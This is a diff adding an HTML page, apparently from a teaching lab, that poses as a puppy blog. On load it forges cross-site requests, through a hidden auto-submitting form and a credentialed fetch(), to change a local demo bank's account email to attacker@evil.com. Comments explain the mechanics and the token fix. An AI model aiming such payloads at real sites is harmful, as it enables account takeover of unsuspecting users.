@@ -1,0 +1,81 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Free Puppy Pics!!! 🐶</title>
+  <style>
+    body { font-family: system-ui, sans-serif; max-width: 640px; margin: 3rem auto; padding: 0 1rem; }
+    .log { background:#111; color:#0f0; font-family:monospace; padding:1rem; border-radius:8px; white-space:pre-wrap; }
+    h1 { margin-bottom:.25rem; }
+    .muted { color:#666; font-size:.9rem; }
+  </style>
+</head>
+<body>
+  <h1>🐶 Cutest Puppies On The Internet 🐶</h1>
+  <p class="muted">
+    Innocent-looking page hosted on a <strong>different origin</strong>
+    (http://localhost:4000). To the victim it is just a puppy blog. In the
+    background it forges a state-changing request to the bank at
+    <code>http://localhost:3000</code> using the victim's own logged-in session.
+  </p>
+
+  <!-- ==========================================================================
+       VARIANT A — auto-submitting hidden <form>
+       --------------------------------------------------------------------------
+       A cross-origin form POST. The browser AUTOMATICALLY attaches the victim's
+       DemoBank session cookie (because the vulnerable server set SameSite=None),
+       so the bank sees an authenticated request and changes the email.
+       No CSRF token is needed by the vulnerable server, so the attacker doesn't
+       have one and doesn't care. This fires on load via JS below.
+       Because the form has NO enctype, it sends
+       application/x-www-form-urlencoded — a "simple request" that needs no
+       CORS preflight, which is exactly why classic CSRF works.
+  =========================================================================== -->
+  <form id="attack" action="http://localhost:3000/account/change-email" method="POST" target="sink">
+    <input type="hidden" name="email" value="attacker@evil.com">
+  </form>
+  <iframe name="sink" style="display:none"></iframe>
+
+  <div class="log" id="log">[attacker] page loaded — launching forged request...\n</div>
+
+  <script>
+    const log = (m) => { document.getElementById('log').textContent += m + '\n'; };
+
+    // Fire VARIANT A automatically, no victim interaction required.
+    window.addEventListener('load', () => {
+      log('[attacker] VARIANT A: auto-submitting cross-site <form> POST to /account/change-email');
+      document.getElementById('attack').submit();
+
+      // ======================================================================
+      //  VARIANT B — fetch() with credentials
+      //  --------------------------------------------------------------------
+      //  Demonstrates the AJAX form of the same attack. `credentials:'include'`
+      //  tells the browser to send the victim's cookie cross-origin.
+      //
+      //  Note: because the vulnerable server has NO CORS restriction and the
+      //  request is a "simple" one (form-encoded body, no custom headers), the
+      //  browser sends it and it succeeds. The attacker cannot READ the response
+      //  (Same-Origin Policy blocks that), but for CSRF they don't need to —
+      //  the side effect (email changed) already happened on the server.
+      //
+      //  A JSON body or a custom header WOULD trigger a CORS preflight and be
+      //  blocked, which is why real APIs that only accept application/json are
+      //  somewhat harder (but NOT immune) to CSRF. The mitigation must cover
+      //  BOTH variants — which the synchronizer token does, since neither
+      //  variant can supply a valid token.
+      // ======================================================================
+      setTimeout(() => {
+        log('[attacker] VARIANT B: fetch() POST with credentials:include');
+        fetch('http://localhost:3000/account/change-email', {
+          method: 'POST',
+          credentials: 'include',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: 'email=attacker-fetch@evil.com'
+        })
+        .then(() => log('[attacker] VARIANT B sent (response opaque to attacker, side effect done)'))
+        .catch(e => log('[attacker] VARIANT B blocked: ' + e));
+      }, 800);
+    });
+  </script>
+</body>
+</html>
